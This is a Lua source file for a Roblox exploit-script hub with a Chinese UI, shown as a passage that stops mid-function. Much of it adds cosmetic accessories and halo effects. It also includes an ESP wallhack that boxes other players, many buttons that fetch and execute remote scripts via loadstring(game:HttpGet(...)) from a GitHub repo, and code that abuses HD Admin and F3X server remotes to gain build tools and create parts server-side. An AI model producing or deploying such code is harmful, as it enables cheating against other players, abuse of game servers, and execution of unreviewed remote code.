handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "火角",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 215718515
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "美金气球",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 14559645454
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "谢德莱特赛卡尔",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 93762663362787
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "莫西干头发",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 191101707
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Button({
	Title = "闪亮女武神",
	Callback = function()
local p = game.Players.LocalPlayer
local c = p.Character or p.CharacterAdded:Wait()
c:WaitForChild("Head")

local id = 1180433861
local acc = game:GetObjects("rbxassetid://"..id)[1]
local handle = acc.Handle
local A1 = handle:FindFirstChildOfClass("Attachment")
local A0 = c:FindFirstChild(A1.Name, true)

acc.Parent = c
handle.Anchored = false
handle.Massless = true
handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

local weld = Instance.new("WeldConstraint", handle)
weld.Part0 = handle
weld.Part1 = A0.Parent
	end 
})

Tabs.NinjaTab:Input({
	Title = "自定义头发ID",
	Placeholder = "输入rbxassetid数字",
	Callback = function(input)	
		getgenv().HairAssetId = tonumber(input)
	end
})

Tabs.NinjaTab:Button({
	Title = "加载自定义头发",
	Callback = function()
		local p = game.Players.LocalPlayer
		local c = p.Character or p.CharacterAdded:Wait()
		c:WaitForChild("Head")

		local id = getgenv().HairAssetId
		if not id then
			return
		end
		local acc = game:GetObjects("rbxassetid://"..id)[1]
		local handle = acc.Handle
		local A1 = handle:FindFirstChildOfClass("Attachment")
		local A0 = c:FindFirstChild(A1.Name, true)

		acc.Parent = c
		handle.Anchored = false
		handle.Massless = true
		handle.CFrame = A0.WorldCFrame * A1.CFrame:Inverse()

		local weld = Instance.new("WeldConstraint", handle)
		weld.Part0 = handle
		weld.Part1 = A0.Parent
	end
})

Tabs.XrayTab:Section({Title = "名字方框"})

Tabs.XrayTab:Toggle({
    Title = "玩家方框ESP",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local Players = game:GetService("Players")
        local lp = Players.LocalPlayer
        if not getgenv().ESP_Connections then
            getgenv().ESP_Connections = {}
        end
        if not getgenv().ESP_Adornments then
            getgenv().ESP_Adornments = {}
        end

        if enabled then
            local function addEsp(plr)
                if plr == lp then return end
                local function charLoaded(char)
                    task.wait()
                    local root = char:WaitForChild("HumanoidRootPart",6)
                    local head = char:WaitForChild("Head",6)
                    if not root or not head then return end

                    local box = Instance.new("BoxHandleAdornment")
                    box.Name = "SafeESP_Box"
                    box.Size = Vector3.new(2.2,5.3,1.2)
                    box.AlwaysOnTop = true
                    box.Color3 = Color3.new(1,0,0)
                    box.Transparency = 0.45
                    box.Adornee = root
                    box.ZIndex = 10
                    box.Parent = char
                    table.insert(getgenv().ESP_Adornments,box)

                    local bill = Instance.new("BillboardGui")
                    bill.AlwaysOnTop = true
                    bill.Size = UDim2.new(3.8,0,1.4,0)
                    bill.StudsOffset = Vector3.new(0,3.2,0)
                    bill.Parent = head
                    table.insert(getgenv().ESP_Adornments,bill)

                    local label = Instance.new("TextLabel")
                    label.BackgroundTransparency = 1
                    label.Size = UDim2.new(1,0,1,0)
                    label.Text = plr.Name
                    label.TextColor3 = Color3.new(1,1,0)
                    label.Font = Enum.Font.SourceSansBold
                    label.TextSize = 19
                    label.Parent = bill
                    table.insert(getgenv().ESP_Adornments,label)
                end
                if plr.Character then
                    task.spawn(charLoaded,plr.Character)
                end
                table.insert(getgenv().ESP_Connections, plr.CharacterAdded:Connect(charLoaded))
            end

            for _,p in ipairs(Players:GetPlayers()) do
                task.spawn(addEsp,p)
            end
            table.insert(getgenv().ESP_Connections, Players.PlayerAdded:Connect(addEsp))
        else
            for _,con in getgenv().ESP_Connections do
                con:Disconnect()
            end
            for _,obj in getgenv().ESP_Adornments do
                pcall(function() obj:Destroy() end)
            end
            table.clear(getgenv().ESP_Connections)
            table.clear(getgenv().ESP_Adornments)
        end
    end,
})

Tabs.HaloTab:Button({
	Title = "彩虹光环",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local rings = {}
local ringCount = 4
local conn

local function MakeRings()
    for _,old in ipairs(rings) do
        if old.inst then old.inst:Destroy() end
    end
    rings = {}

    local char = lp.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    for i = 1, ringCount do
        local ring = Instance.new("Part")
        ring.Name = "RainbowRing"..i
        ring.Shape = Enum.PartType.Cylinder
        ring.Material = Enum.Material.Neon
        ring.Transparency = 0.35
        ring.CanCollide = false
        ring.CanTouch = false
        ring.Anchored = true 
        ring.Size = Vector3.new(0.3, 11 + i * 2, 11 + i * 2)
        ring.Parent = workspace

        table.insert(rings,{
            inst = ring,
            speed = i * 0.32,
            hueOffset = i / ringCount
        })
    end
end

MakeRings()

if conn then conn:Disconnect() end
conn = RunService.RenderStepped:Connect(function(dt)
    local char = lp.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local now = os.clock()
    for _,v in ipairs(rings) do
        local hue = (now * 0.42 + v.hueOffset) % 1
        v.inst.Color = Color3.fromHSV(hue,1,1)
        local base = root.CFrame * CFrame.new(0, 2.4, 0)
        v.inst.CFrame = base * CFrame.Angles(0, now * v.speed, 0)
    end
end)

lp.CharacterAdded:Connect(function()
    task.wait(0.25)
    MakeRings()
end)
	end 
})

Tabs.HaloTab:Button({
	Title = "环绕小球",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local orbitBalls = {}
local ballCount = 8
local conn

local function CreateEffect()
	for _,obj in ipairs(orbitBalls) do
		if obj.inst then obj.inst:Destroy() end
	end
	orbitBalls = {}

	local char = lp.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end

	for i = 1, ballCount do
		local ball = Instance.new("Part")
		ball.Name = "OrbitBall"..i
		ball.Shape = Enum.PartType.Ball
		ball.Material = Enum.Material.Neon
		ball.Transparency = 0
		ball.CanCollide = false
		ball.CanTouch = false
		ball.Anchored = true
		ball.Size = Vector3.new(1.2,1.2,1.2)
		ball.Parent = workspace

		table.insert(orbitBalls,{
			inst = ball,
			angleStep = (math.pi*2 / ballCount)*i,
			orbitRadius = 14,
			height = 2.6,
			speed = 1.1
		})
	end
end

CreateEffect()

if conn then conn:Disconnect() end
conn = RunService.RenderStepped:Connect(function()
	local char = lp.Character
	if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	local t = os.clock()

	for _,v in ipairs(orbitBalls) do
		local ang = t * v.speed + v.angleStep
		local ox = math.cos(ang) * v.orbitRadius
		local oz = math.sin(ang) * v.orbitRadius
		local hue = (t*0.6 + v.angleStep) %1
		v.inst.Color = Color3.fromHSV(hue,1,1)
		v.inst.CFrame = root.CFrame * CFrame.new(ox, v.height, oz)
	end
end)

lp.CharacterAdded:Connect(function()
	task.wait(0.25)
	CreateEffect()
end)
	end 
})

Tabs.HaloTab:Button({
	Title = "天使光环",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local ringPieces = {}
local conn
local pieceCount = 22 
local ringRadius = 2.1
local tubeThickness = 0.18
local heightOffset = 3.3

local function MakeHalo()
    for _,p in ipairs(ringPieces) do
        if p.part then p.part:Destroy() end
    end
    ringPieces = {}

    local char = lp.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    local angleStep = (math.pi*2)/pieceCount
    for i = 1, pieceCount do
        local piece = Instance.new("Part")
        piece.Shape = Enum.PartType.Cylinder
        piece.Material = Enum.Material.Neon
        piece.Color = Color3.new(1, 0.85, 0.3) 
        piece.Transparency = 0.08
        piece.Anchored = true
        piece.CanCollide = false
        piece.CanTouch = false
        piece.CastShadow = false
        piece.Size = Vector3.new(tubeThickness, 0.45, 0.45)
        piece.Parent = workspace

        table.insert(ringPieces,{
            part = piece,
            index = i
        })
    end
end

MakeHalo()

if conn then conn:Disconnect() end
conn = RunService.RenderStepped:Connect(function()
    local char = lp.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local t = os.clock()
    local rotateSpeed = t * 0.25
    local angleStep = (math.pi*2)/pieceCount

    for idx,item in ipairs(ringPieces) do
        local ang = angleStep*idx + rotateSpeed
        local x = math.cos(ang)*ringRadius
        local z = math.sin(ang)*ringRadius
        local worldCFrame = root.CFrame * CFrame.new(x, heightOffset, z) * CFrame.Angles(0,ang,math.rad(90))
        item.part.CFrame = worldCFrame
    end
end)

lp.CharacterAdded:Connect(function()
    task.wait(0.3)
    MakeHalo()
end)
	end 
})

Tabs.HaloTab:Button({
	Title = "走路拖尾",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local conn
local trailObj = nil

local function BuildTrail()
	if trailObj then
		trailObj:Destroy()
	end
	local char = lp.Character
	if not char then return end
	local root = char:WaitForChild("HumanoidRootPart")

	local att0 = Instance.new("Attachment")
	att0.Position = Vector3.new(-0.3, -1.8, 0)
	att0.Parent = root

	local att1 = Instance.new("Attachment")
	att1.Position = Vector3.new(0.3, -1.8, 0)
	att1.Parent = root

	trailObj = Instance.new("Trail")
	trailObj.Attachment0 = att0
	trailObj.Attachment1 = att1
	trailObj.Lifetime = 1.4 
	trailObj.WidthScale = NumberSequence.new{
		NumberSequenceKeypoint.new(0,0.9),
		NumberSequenceKeypoint.new(1,0)
	}
	trailObj.Transparency = NumberSequence.new{
		NumberSequenceKeypoint.new(0,0),
		NumberSequenceKeypoint.new(1,1)
	}
	trailObj.Parent = root
end

BuildTrail()

conn = RunService.RenderStepped:Connect(function()
	if not trailObj then return end
	local t = os.clock()
	trailObj.Color = ColorSequence.new(Color3.fromHSV(t * 0.45 % 1, 1, 1))
end)

lp.CharacterAdded:Connect(function()
	task.wait(0.2)
	BuildTrail()
end)
	end 
})
Tabs.HaloTab:Button({
	Title = "跳跃特效",
	Callback = function()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

local CONFIG = {
    Segments = 120,
    MaxRadius = 6,
    TubeRadius = 0.6,
    Overlap = 1.2,
    GrowTime = 0.5,
    HoldTime = 0.2,
    FadeTime = 0.3,
    Cooldown = 0.3,
    Color = Color3.fromRGB(0, 180, 255),
    LightBrightness = 2.5,
    LightRange = 15,
}

local TUBE_HEIGHT = CONFIG.TubeRadius * 2 * CONFIG.Overlap
local lastSpawn = 0

local characterConnections = {}

local function spawnHalo(centerPos)
    local parts = {}
    local SEGMENTS = CONFIG.Segments
    local MAX_RADIUS = CONFIG.MaxRadius
    local TUBE_RADIUS = CONFIG.TubeRadius

    for i = 1, SEGMENTS do
        local angle = (i / SEGMENTS) * 2 * math.pi
        local pos = centerPos + Vector3.new(
            MAX_RADIUS * math.cos(angle),
            0,
            MAX_RADIUS * math.sin(angle)
        )
        local tangent = Vector3.new(-math.sin(angle), 0, math.cos(angle))

        local part = Instance.new("Part")
        part.Shape = Enum.PartType.Cylinder
        part.Size = Vector3.new(0.1, 0.1, 0.1)
        part.CFrame = CFrame.new(centerPos)
        part.Anchored = true
        part.CanCollide = false
        part.Material = Enum.Material.Neon
        part.Transparency = 0
        part.Color = CONFIG.Color
        part.Parent = workspace

        local finalCF = CFrame.fromMatrix(pos, tangent, Vector3.new(0, 1, 0))
        local finalSize = Vector3.new(TUBE_RADIUS, TUBE_HEIGHT, TUBE_RADIUS)

        table.insert(parts, { part = part, finalCF = finalCF, finalSize = finalSize })
    end

    local lightPart = Instance.new("Part")
    lightPart.Size = Vector3.new(0.2, 0.2, 0.2)
    lightPart.CFrame = CFrame.new(centerPos)
    lightPart.Anchored = true
    lightPart.CanCollide = false
    lightPart.Transparency = 1
    lightPart.Parent = workspace

    local light = Instance.new("PointLight")
    light.Parent = lightPart
    light.Brightness = 0
    light.Range = CONFIG.LightRange
    light.Color = CONFIG.Color

    local growInfo = TweenInfo.new(CONFIG.GrowTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    for _, data in ipairs(parts) do
        TweenService:Create(data.part, growInfo, {
            CFrame = data.finalCF,
            Size = data.finalSize
        }):Play()
    end
    TweenService:Create(light, growInfo, {
        Brightness = CONFIG.LightBrightness
    }):Play()

    wait(CONFIG.GrowTime + CONFIG.HoldTime)

    local fadeInfo = TweenInfo.new(CONFIG.FadeTime, Enum.EasingStyle.Linear)
    for _, data in ipairs(parts) do
        TweenService:Create(data.part, fadeInfo, {
            Transparency = 1
        }):Play()
    end
    TweenService:Create(light, fadeInfo, {
        Brightness = 0
    }):Play()

    wait(CONFIG.FadeTime + 0.1)
    for _, data in ipairs(parts) do
        data.part:Destroy()
    end
    lightPart:Destroy()
end

local function setupCharacter(char)
    local humanoid = char:FindFirstChild("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not humanoid or not hrp then
        return
    end

    if characterConnections[char] then
        characterConnections[char]:Disconnect()
        characterConnections[char] = nil
    end

    local conn = humanoid.StateChanged:Connect(function(oldState, newState)
        if newState == Enum.HumanoidStateType.Jumping or newState == Enum.HumanoidStateType.Freefall then
            local now = tick()
            if now - lastSpawn >= CONFIG.Cooldown then
                lastSpawn = now
                local footY = hrp.Position.Y - hrp.Size.Y / 2
                local pos = Vector3.new(hrp.Position.X, footY, hrp.Position.Z)
                spawn(function() spawnHalo(pos) end)
            end
        end
    end)

    characterConnections[char] = conn

    char.AncestryChanged:Connect(function()
        if not char.Parent then
            if characterConnections[char] then
                characterConnections[char]:Disconnect()
                characterConnections[char] = nil
            end
        end
    end)
end

local function onCharacterAdded(char)

    char:WaitForChild("Humanoid")
    char:WaitForChild("HumanoidRootPart")
    setupCharacter(char)
end

if player.Character then
    onCharacterAdded(player.Character)
end

player.CharacterAdded:Connect(onCharacterAdded)
	end 
})
Tabs.HaloTab:Button({
	Title = "一键清理",
	Callback = function()
local Workspace = game:GetService("Workspace")

for _,obj in ipairs(Workspace:GetChildren()) do
    if obj:IsA("Part") and (obj.Name == "AngelHalo" or obj.Material == Enum.Material.Neon) then
        if obj.Size.X <=0.3 and obj.Shape == Enum.PartType.Cylinder then
            obj:Destroy()
        end
    end
end

local function ClearTrail(parent)
    for _,v in ipairs(parent:GetDescendants()) do
        if v:IsA("Trail") or v:IsA("Attachment") then
            v:Destroy()
        end
    end
end
ClearTrail(game.Players.LocalPlayer.Character)
ClearTrail(game.Players.LocalPlayer.CharacterAdded)
	end 
})
Tabs.HaloTab:Button({
	Title = "脚下光环",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local beamRingList = {}
local renderConn = nil

local soulCfg = {
    {radius = 1.7, color = Color3.new(0,0,0), speed = 0.4},
    {radius = 2.3, color = Color3.new(1,0,0), speed = 0.6},
    {radius = 2.9, color = Color3.new(1,0.15,0.5), speed = 0.8},
    {radius = 3.5, color = Color3.new(0.5,0,0.8), speed = 1.0},
    {radius = 4.1, color = Color3.new(0,0.4,1), speed = 1.2},
    {radius = 4.7, color = Color3.new(0,1,0.35), speed = 1.4},
    {radius = 5.3, color = Color3.new(1,0.88,0), speed = 1.6},
}
local segmentCount = 36
local beamWidth = 0.22

local function SpawnSoulBeamRing()
    if renderConn then renderConn:Disconnect() renderConn = nil end
    for _,group in ipairs(beamRingList) do
        for _,b in ipairs(group.beams) do
            if b then b:Destroy() end
        end
        for _,a in ipairs(group.atts) do
            if a then a:Destroy() end
        end
    end
    beamRingList = {}

    local char = lp.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    for _,cfg in ipairs(soulCfg) do
        local beams = {}
        local atts = {}
        for i=1,segmentCount do
            local a0 = Instance.new("Attachment")
            a0.Parent = root
            local a1 = Instance.new("Attachment")
            a1.Parent = root
            local b = Instance.new("Beam")
            b.Attachment0 = a0
            b.Attachment1 = a1
            b.Width0 = beamWidth
            b.Width1 = beamWidth
            b.Color = ColorSequence.new(cfg.color)
            b.Transparency = NumberSequence.new(0.15)
            b.Parent = root
            table.insert(beams,b)
            table.insert(atts,{a0,a1})
        end
        table.insert(beamRingList,{
            beams = beams,
            atts = atts,
            radius = cfg.radius,
            speed = cfg.speed
        })
    end

    renderConn = RunService.RenderStepped:Connect(function()
        local c = lp.Character
        if not c then return end
        local rt = c:FindFirstChild("HumanoidRootPart")
        if not rt then return end
        local t = os.clock()
        local angStep = (math.pi*2)/segmentCount
        for _,ringData in ipairs(beamRingList) do
            local rot = t * ringData.speed
            for i=1,segmentCount do
                local ang1 = angStep*i + rot
                local ang2 = angStep*(i+1) + rot
                local yOffset = -1.72
                local att0 = ringData.atts[i][1]
                local att1 = ringData.atts[i][2]
                att0.Position = Vector3.new(math.cos(ang1)*ringData.radius, yOffset, math.sin(ang1)*ringData.radius)
                att1.Position = Vector3.new(math.cos(ang2)*ringData.radius, yOffset, math.sin(ang2)*ringData.radius)
            end
        end
    end)
end

SpawnSoulBeamRing()
	end 
})
Tabs.HaloTab:Button({
	Title = "关闭",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

if renderConn then renderConn:Disconnect() end
local char = lp.Character
if char then
    for _,v in ipairs(char:GetDescendants()) do
        if v:IsA("Beam") or v:IsA("Attachment") then
            v:Destroy()
        end
    end
end
	end 
})
Tabs.HaloTab:Button({
	Title = "跳跃波纹",
	Callback = function()
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local lastJump = false
local wavePool = {}
local updateConn = nil

local setting = {
    speed = 7,
    maxRadius = 4.4,
    lineWidth = 0.3,
    color = Color3.new(0,0.7,1),
    lifetime = 1.2
}
local pointCount = 40

local function CreateRingWave(pos)
    local attTable0 = {}
    local attTable1 = {}
    local beamTable = {}
    for i = 1, pointCount do
        local a0 = Instance.new("Attachment")
        local a1 = Instance.new("Attachment")
        local b = Instance.new("Beam")
        b.Attachment0 = a0
        b.Attachment1 = a1
        b.Width0 = setting.lineWidth
        b.Width1 = setting.lineWidth
        b.Color = ColorSequence.new(setting.color)
        b.Transparency = NumberSequence.new(0)
        a0.Parent = workspace.Terrain
        a1.Parent = workspace.Terrain
        b.Parent = workspace.Terrain
        table.insert(attTable0,a0)
        table.insert(attTable1,a1)
        table.insert(beamTable,b)
    end
    table.insert(wavePool,{
        att0 = attTable0,
        att1 = attTable1,
        beams = beamTable,
        origin = pos,
        spawnTime = os.clock()
    })
end

local function StartJumpEffect()
    if updateConn then updateConn:Disconnect() end
    updateConn = RunService.RenderStepped:Connect(function()
        local char = lp.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end

        local footY = root.Position.Y - 2.35
        local groundPos = Vector3.new(root.Position.X, footY, root.Position.Z)

        if hum.Jump and not lastJump then
            CreateRingWave(groundPos)
        end
        lastJump = hum.Jump

        local now = os.clock()
        for idx = #wavePool,1,-1 do
            local data = wavePool[idx]
            local pass = now - data.spawnTime
            if pass > setting.lifetime then
                for _,b in ipairs(data.beams) do b:Destroy() end
                for _,a in ipairs(data.att0) do a:Destroy() end
                for _,a in ipairs(data.att1) do a:Destroy() end
                table.remove(wavePool,idx)
            else
                local radius = math.min(pass * setting.speed, setting.maxRadius)
                local alpha = pass / setting.lifetime
                local angleStep = (math.pi*2)/pointCount
                for i = 1, pointCount do
                    local ang1 = angleStep*i
                    local ang2 = angleStep*(i+1)
                    local p0 = Vector3.new(math.cos(ang1)*radius + data.origin.X, data.origin.Y, math.sin(ang1)*radius + data.origin.Z)
                    local p1 = Vector3.new(math.cos(ang2)*radius + data.origin.X, data.origin.Y, math.sin(ang2)*radius + data.origin.Z)
                    data.att0[i].Position = p0
                    data.att1[i].Position = p1
                    data.beams[i].Transparency = NumberSequence.new(alpha)
                end
            end
        end
    end)
end

StartJumpEffect()
	end 
})
Tabs.HaloTab:Button({
	Title = "关闭",
	Callback = function()
if updateConn then updateConn:Disconnect() end
for _,data in ipairs(wavePool) do
    for _,b in ipairs(data.beams) do b:Destroy() end
    for _,a in ipairs(data.att0) do a:Destroy() end
    for _,a in ipairs(data.att1) do a:Destroy() end
end
wavePool = {}
	end 
})
Tabs.ServerTab:Section({
        Title = gradient("支持游戏列表",Color3.fromHex("#ff2222"),Color3.fromHex("#22ccff"))
    })
    
    Tabs.ServerTab:Button({
        Title = "+1斧头挥动逃脱-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/%E5%8A%A01%E6%96%A7%E5%A4%B4%E9%80%83%E8%84%B1"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "1000000美元跑酷-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/10000000w"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "末日砖块无冷却-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/doomsday"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "手枪竞技场-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/guns"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "逃离脑退化-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Get%20rich%20overnight"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "+1翅膀（给脑腐者）-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/brain"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "扔出一枚硬币-点击加载",
        Callback = function()

        end 
    })
    Tabs.ServerTab:Button({
        Title = "排干河水-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/tea1"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "忍者传奇-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Ninja"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "爱德华食人列车-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Edward"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "韩国学校区-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/South%20Korea"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "幸运方块战场-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/lucky"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "堡垒-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/fortress"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "每次点击加1速度-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/car"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "糖果键盘跑酷-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/keyboard"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "力量传奇-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Legends%20of%20Power"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "踢幸运方块-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Kick%20it%20lucky"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "监狱人生-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/jail"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "骨折模拟器-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Fracture"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "血债-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Blood%20debt"))()
        end 
    })
     Tabs.ServerTab:Button({
        Title = "按下一个键帽-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Gold"))()
        end 
    })
  Tabs.ServerTab:Button({
        Title = "国人捐赠-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/china"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "举起一个立方体-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Weightlifting"))()
        end 
    })    
    Tabs.ServerTab:Button({
        Title = "巴里的监狱-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/Paris%20jail"))()
        end 
    })
    Tabs.ServerTab:Button({
        Title = "偷一个蛋-点击加载",
        Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/egg1"))()
        end 
    })
Tabs.F3xTab:Button({
	Title = "f3x",
	Callback = function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";btools me")
	end 
})

Tabs.F3xTab:Section({Title = "F3X‑旋转天空盒"})
local skyTexId = "135461405245048"

Tabs.F3xTab:Input({
    Title = "天空贴图ID",
    Value = skyTexId,
    Placeholder = "只填数字资产ID",
    Callback = function(text)
        local str = text:gsub("%s","")
        skyTexId = str
    end
})

Tabs.F3xTab:Button({
    Title = "生成旋转天空盒",
    Callback = function()
        local player = game.Players.LocalPlayer
        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then return end

        local tool
        for _,v in player:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        for _,v in game.ReplicatedStorage:GetDescendants() do
            if v.Name == "SyncAPI" then
                tool = v.Parent
            end
        end
        if not tool or not tool:FindFirstChild("SyncAPI") or not tool.SyncAPI:FindFirstChild("ServerEndpoint") then
            return
        end
        local remote = tool.SyncAPI.ServerEndpoint

        local function _(args)
            remote:InvokeServer(unpack(args))
        end
        local function SetCollision(part,boolean)
            local args = {{"SyncCollision",{{Part=part,CanCollide=boolean}}}}
            _(args)
        end
        local function SetAnchor(boolean,part)
            local args = {{"SyncAnchor",{{Part=part,Anchored=boolean}}}}
            _(args)
        end
        local function CreatePart(cf,parent)
            local args = {"CreatePart","Normal",cf,parent}
            _(args)
        end
        local function DestroyPart(part)
            local args = {"Remove",{part}}
            _(args)
        end
        local function MovePart(part,cf)
